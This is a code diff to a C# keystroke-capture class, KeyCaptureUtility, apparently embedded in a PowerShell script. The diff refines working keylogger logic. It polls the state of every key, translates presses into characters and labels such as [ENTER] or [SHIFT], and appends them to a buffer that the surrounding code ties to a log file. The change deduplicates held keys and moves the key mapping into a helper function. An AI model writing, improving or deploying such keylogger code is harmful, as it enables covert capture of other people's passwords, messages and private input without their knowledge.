@@ -64,6 +64,7 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
+using System.Collections.Generic;
 
 public class KeyCaptureUtility
 {
@@ -85,6 +86,7 @@ public class KeyCaptureUtility
         StringBuilder captureBuffer = new StringBuilder();
         var lastKeypressTime = System.Diagnostics.Stopwatch.StartNew();
         TimeSpan keypressThreshold = TimeSpan.FromSeconds(10);
+        HashSet<int> pressedKeys = new HashSet<int>();  // To track pressed keys
 
         // Ensure the file exists, create it if it doesn't
         if (!File.Exists(filePath))
@@ -109,8 +111,9 @@ public class KeyCaptureUtility
                     short keyst = GetAsyncKeyState(asc);
 
                     // Check if the key is pressed (key state = -32767 means pressed)
-                    if (keyst == -32767)
+                    if ((keyst & 0x8000) != 0 && !pressedKeys.Contains(asc)) // Only capture the first press
                     {
+                        pressedKeys.Add(asc); // Mark this key as pressed
                         keyPressed = true;
                         lastKeypressTime.Restart();  // Reset inactivity timer
 
@@ -121,68 +124,32 @@ public class KeyCaptureUtility
                         StringBuilder logChar = new StringBuilder();
 
                         // Get the character for the key
-                        if (ToUnicode((uint)asc, (uint)vtkey, kbst, logChar, logChar.Capacity, 0) != 0)
+                        int unicodeResult = ToUnicode((uint)asc, (uint)vtkey, kbst, logChar, logChar.Capacity, 0);
+
+                        // If ToUnicode returns a valid character
+                        if (unicodeResult > 0)
                         {
                             string charPressed = logChar.ToString();
+                            Console.WriteLine("asc: " + asc);  // Log the saved message
 
                             // Handle special keys based on provided mapping
-                            switch (asc)
-                            {
-                                case 8: charPressed = "[BKSP]"; break;  // Backspace
-                                case 13: charPressed = "[ENTER]"; break;  // Enter
-                                case 27: charPressed = "[ESC]"; break;  // Escape
-                                case 9: charPressed = "[TAB]"; break;  // Tab
-                                case 32: charPressed = "[SPACE]"; break;  // Space bar
-                                case 46: charPressed = "[DEL]"; break;  // Delete
-                                case 37: charPressed = "[LEFT]"; break;  // Left Arrow
-                                case 38: charPressed = "[UP]"; break;  // Up Arrow
-                                case 39: charPressed = "[RIGHT]"; break;  // Right Arrow
-                                case 40: charPressed = "[DOWN]"; break;  // Down Arrow
-                                case 33: charPressed = "[PGUP]"; break;  // Page Up
-                                case 34: charPressed = "[PGDN]"; break;  // Page Down
-                                case 35: charPressed = "[END]"; break;  // End
-                                case 36: charPressed = "[HOME]"; break;  // Home
-                                case 144: charPressed = "[NUMLOCK]"; break;  // Num Lock
-                                case 145: charPressed = "[SCROLLLOCK]"; break;  // Scroll Lock
-                                case 112: charPressed = "[F1]"; break;  // F1
-                                case 113: charPressed = "[F2]"; break;  // F2
-                                case 114: charPressed = "[F3]"; break;  // F3
-                                case 115: charPressed = "[F4]"; break;  // F4
-                                case 116: charPressed = "[F5]"; break;  // F5
-                                case 117: charPressed = "[F6]"; break;  // F6
-                                case 118: charPressed = "[F7]"; break;  // F7
-                                case 119: charPressed = "[F8]"; break;  // F8
-                                case 120: charPressed = "[F9]"; break;  // F9
-                                case 121: charPressed = "[F10]"; break;  // F10
-                                case 122: charPressed = "[F11]"; break;  // F11
-                                case 123: charPressed = "[F12]"; break;  // F12
-                                // Numeric keypad keys
-                                case 96: charPressed = "[NUMPAD0]"; break;  // NumPad 0
-                                case 97: charPressed = "[NUMPAD1]"; break;  // NumPad 1
-                                case 98: charPressed = "[NUMPAD2]"; break;  // NumPad 2
-                                case 99: charPressed = "[NUMPAD3]"; break;  // NumPad 3
-                                case 100: charPressed = "[NUMPAD4]"; break;  // NumPad 4
-                                case 101: charPressed = "[NUMPAD5]"; break;  // NumPad 5
-                                case 102: charPressed = "[NUMPAD6]"; break;  // NumPad 6
-                                case 103: charPressed = "[NUMPAD7]"; break;  // NumPad 7
-                                case 104: charPressed = "[NUMPAD8]"; break;  // NumPad 8
-                                case 105: charPressed = "[NUMPAD9]"; break;  // NumPad 9
-                                case 107: charPressed = "[NUMPAD+]"; break;  // NumPad +
-                                case 109: charPressed = "[NUMPAD-]"; break;  // NumPad -
-                                case 187: charPressed = "[NUMPAD=]"; break;  // NumPad =
-                                // Special keys for Alt, Shift, Control
-                                case 91: charPressed = "[WINDOWS]"; break;  // Windows key
-                                case 160: charPressed = "[SHIFT]"; break;  // Left Shift
-                                case 162: charPressed = "[CONTROL]"; break;  // Left Control
-                                case 163: charPressed = "[RIGHT CONTROL]"; break;  // Right Control
-                                case 164: charPressed = "[LEFT ALT]"; break;  // Left Alt
-                                case 165: charPressed = "[RIGHT ALT]"; break;  // Right Alt
-                                case 220: charPressed = "[BACKSLASH]"; break;  // Backslash
-                                case 20: charPressed = "[CAPSLOCK]"; break;  // Caps Lock
-                            }
+                            charPressed = HandleSpecialKeys(asc, charPressed);
 
                             captureBuffer.Append(charPressed);
                         }
+                        else
+                        {
+                            // If the key is non-printable, handle the special keys separately
+                            string specialKey = HandleSpecialKeys(asc, null);
+                            if (!string.IsNullOrEmpty(specialKey))
+                            {
+                                captureBuffer.Append(specialKey);
+                            }
+                        }
+                    }
+                    else if ((keyst & 0x8000) == 0 && pressedKeys.Contains(asc)) // Key was released
+                    {
+                        pressedKeys.Remove(asc); // Remove from pressed set when key is released
                     }
                 }
             }
@@ -201,8 +168,50 @@ public class KeyCaptureUtility
             lastKeypressTime.Restart();
         }
     }
-}
 
+    // Handle special keys manually
+    public static string HandleSpecialKeys(int asc, string charPressed)
+    {
+        // Handle known special keys
+        switch (asc)
+        {
+            case 8: return "[BKSP]";  // Backspace
+            case 9: return "[TAB]";  // Tab
+            case 13: return "[ENTER]";  // Enter
+            case 27: return "[ESC]";  // Escape
+            case 32: return "[SPACE]";  // Space bar
+            case 37: return "[LEFT]";  // Left Arrow
+            case 38: return "[UP]";  // Up Arrow
+            case 39: return "[RIGHT]";  // Right Arrow
+            case 40: return "[DOWN]";  // Down Arrow
+            case 46: return "[DEL]";  // Delete
+            case 91: return "[WINDOWS]";  // Windows key
+            case 160: return "[SHIFT]";  // Left Shift
+            case 162: return "[CONTROL]";  // Left Control
+            case 163: return "[RIGHT CONTROL]";  // Right Control
+            case 164: return "[LEFT ALT]";  // Left Alt
+            case 165: return "[RIGHT ALT]";  // Right Alt
+            case 220: return "[BACKSLASH]";  // Backslash
+            case 20: return "[CAPSLOCK]";  // Caps Lock
+            case 144: return "[NUMLOCK]";  // Num Lock
+            case 145: return "[SCROLLLOCK]";  // Scroll Lock
+            case 112: return "[F1]";  // F1
+            case 113: return "[F2]";  // F2
+            case 114: return "[F3]";  // F3
+            case 115: return "[F4]";  // F4
+            case 116: return "[F5]";  // F5
+            case 117: return "[F6]";  // F6
+            case 118: return "[F7]";  // F7
+            case 119: return "[F8]";  // F8
+            case 120: return "[F9]";  // F9
+            case 121: return "[F10]";  // F10
+            case 122: return "[F11]";  // F11
+            case 123: return "[F12]";  // F12
+            default:
+                return charPressed;  // Return original character if it's a printable key
+        }
+    }
+}
 "@
 }
 
